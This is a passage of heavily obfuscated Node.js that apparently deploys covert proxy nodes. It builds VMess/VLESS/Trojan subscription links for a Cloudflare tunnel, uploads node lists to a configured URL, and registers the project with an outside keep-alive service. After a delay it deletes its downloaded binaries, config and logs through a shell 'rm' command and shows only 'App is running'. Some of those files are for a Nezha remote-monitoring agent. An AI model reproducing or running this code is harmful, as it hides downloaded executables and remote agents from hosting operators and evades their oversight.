_0x39b2fa={_0x5656a5:0x1eb,_0x1a2280:0x192},_0x5bd74b=_0x5206,_0x355276={'v':'2','ps':''+_0x3dacea,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5bd74b(_0x3cd2b5._0x25ab3f),'host':_0x1f7d08,'path':'/vmess-argo?ed=2560','tls':_0x5bd74b(_0x3cd2b5._0x2690df),'sni':_0x1f7d08,'alpn':'','fp':_0x5bd74b(0x1ba)},_0x2f1d6a=_0x5bd74b(_0x3cd2b5._0x12ad36)+UUID+'@'+CFIP+':'+CFPORT+_0x5bd74b(0x1a6)+_0x1f7d08+_0x5bd74b(0x1ec)+_0x1f7d08+_0x5bd74b(_0x3cd2b5._0x3ea568)+_0x3dacea+_0x5bd74b(_0x3cd2b5._0x52f796)+Buffer['from'](JSON[_0x5bd74b(_0x3cd2b5._0x2863ef)](_0x355276))[_0x5bd74b(_0x3cd2b5._0x417793)](_0x5bd74b(0x1eb))+_0x5bd74b(_0x3cd2b5._0x5ce0dc)+UUID+'@'+CFIP+':'+CFPORT+_0x5bd74b(_0x3cd2b5._0x3b9ba9)+_0x1f7d08+_0x5bd74b(_0x3cd2b5._0x4e44d7)+_0x1f7d08+_0x5bd74b(_0x3cd2b5._0x220eb2)+_0x3dacea+'\x0a\x20\x20\x20\x20';console[_0x5bd74b(_0x3cd2b5._0x1c971c)](Buffer['from'](_0x2f1d6a)[_0x5bd74b(_0x3cd2b5._0x417793)](_0x5bd74b(0x1eb))),fs[_0x5bd74b(_0x3cd2b5._0x32b8a1)](subPath,Buffer[_0x5bd74b(0x1d3)](_0x2f1d6a)[_0x5bd74b(_0x3cd2b5._0x21d9d8)](_0x5bd74b(_0x3cd2b5._0x45a140))),console[_0x5bd74b(0x1a4)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5bd74b(_0x3cd2b5._0x1f79b1)]('/'+SUB_PATH,(_0xb83f28,_0x17526d)=>{const _0xd4c58c=_0x5bd74b,_0x1b7573=Buffer[_0xd4c58c(0x1d3)](_0x2f1d6a)['toString'](_0xd4c58c(_0x39b2fa._0x5656a5));_0x17526d[_0xd4c58c(0x1d5)](_0xd4c58c(0x1c1),_0xd4c58c(0x1f9)),_0x17526d[_0xd4c58c(_0x39b2fa._0x1a2280)](_0x1b7573);}),_0x442923(_0x2f1d6a);},0x7d0);});}}async function uploadNodes(){const _0x3d6ba4={_0x121947:0x18b,_0x57cfdf:0x215,_0x57fd4a:0x1a3,_0x416283:0x1aa,_0x4e56b3:0x23a,_0x17fa63:0x1a3,_0x3dc109:0x1a4},_0x46d81b=_0x460aa4;if(UPLOAD_URL&&PROJECT_URL){const _0x2adea5=PROJECT_URL+'/'+SUB_PATH,_0x4bf480={'subscription':[_0x2adea5]};try{const _0x51ef94=await axios[_0x46d81b(_0x3d6ba4._0x121947)](UPLOAD_URL+_0x46d81b(_0x3d6ba4._0x57cfdf),_0x4bf480,{'headers':{'Content-Type':'application/json'}});return _0x51ef94&&_0x51ef94[_0x46d81b(_0x3d6ba4._0x57fd4a)]===0xc8?(console[_0x46d81b(0x1a4)]('Subscription\x20uploaded\x20successfully'),_0x51ef94):null;}catch(_0x3ca442){if(_0x3ca442[_0x46d81b(0x1fc)]){if(_0x3ca442['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1cd9e8=fs['readFileSync'](listPath,_0x46d81b(0x1f3)),_0x6304e0=_0x1cd9e8['split']('\x0a')[_0x46d81b(_0x3d6ba4._0x416283)](_0x2448dc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x46d81b(0x1cb)](_0x2448dc));if(_0x6304e0[_0x46d81b(0x202)]===0x0)return;const _0x532c0a=JSON[_0x46d81b(_0x3d6ba4._0x4e56b3)]({'nodes':_0x6304e0});try{const _0x73bae5=await axios[_0x46d81b(0x18b)](UPLOAD_URL+'/api/add-nodes',_0x532c0a,{'headers':{'Content-Type':_0x46d81b(0x1c3)}});return _0x73bae5&&_0x73bae5[_0x46d81b(_0x3d6ba4._0x17fa63)]===0xc8?(console[_0x46d81b(_0x3d6ba4._0x3dc109)](_0x46d81b(0x1ad)),_0x73bae5):null;}catch(_0x148be1){return null;}}else return;}}function cleanFiles(){const _0x132721={_0x5ce437:0x201,_0x513e49:0x234,_0x3ee315:0x1e9,_0x29d138:0x23f,_0x5ea5e8:0x1bb};setTimeout(()=>{const _0x366e2b={_0x55b526:0x1cd,_0x1e5e0c:0x1a4,_0x3ef300:0x1ee},_0x33f723={_0x57513a:0x1a4,_0x5dad24:0x1a4},_0x55640a=_0x5206,_0xde7c0c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xde7c0c[_0x55640a(_0x132721._0x5ce437)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xde7c0c['push'](phpPath);process['platform']===_0x55640a(_0x132721._0x513e49)?exec(_0x55640a(0x1a0)+_0xde7c0c[_0x55640a(_0x132721._0x3ee315)]('\x20')+_0x55640a(_0x132721._0x29d138),_0x5ac0d0=>{const _0x1c2e10=_0x55640a;console['clear'](),console[_0x1c2e10(_0x33f723._0x57513a)](_0x1c2e10(0x19c)),console[_0x1c2e10(_0x33f723._0x5dad24)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x55640a(_0x132721._0x5ea5e8)+_0xde7c0c[_0x55640a(_0x132721._0x3ee315)]('\x20')+'\x20>/dev/null\x202>&1',_0x1173dc=>{const _0x1368ae=_0x55640a;console[_0x1368ae(_0x366e2b._0x55b526)](),console[_0x1368ae(_0x366e2b._0x1e5e0c)]('App\x20is\x20running'),console[_0x1368ae(0x1a4)](_0x1368ae(_0x366e2b._0x3ef300));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x19de40={_0x2cb1a4:0x19e,_0x1e38e6:0x1c3,_0x5087c9:0x1ef,_0x3b361a:0x20a},_0x1c9d0f=_0x460aa4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1c9d0f(0x1a4)](_0x1c9d0f(_0x19de40._0x2cb1a4));return;}try{const _0x1e9036=await axios[_0x1c9d0f(0x18b)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1c9d0f(_0x19de40._0x1e38e6)}});return console['log'](_0x1c9d0f(_0x19de40._0x5087c9)),_0x1e9036;}catch(_0x492f4f){return console[_0x1c9d0f(0x193)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x492f4f[_0x1c9d0f(_0x19de40._0x3b361a)]),null;}}async function startserver(){const _0x28fe29={_0x1e7a3c:0x193},_0x3ca5fd=_0x460aa4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x139f58){console[_0x3ca5fd(_0x28fe29._0x1e7a3c)]('Error\x20in\x20startserver:',_0x139f58);}}startserver()['catch'](_0x45d414=>{const _0x5e121f=_0x460aa4;console['error'](_0x5e121f(0x1dc),_0x45d414);}),app[_0x460aa4(0x21d)](PORT,()=>console[_0x460aa4(0x1a4)](_0x460aa4(0x209)+PORT+'!'));
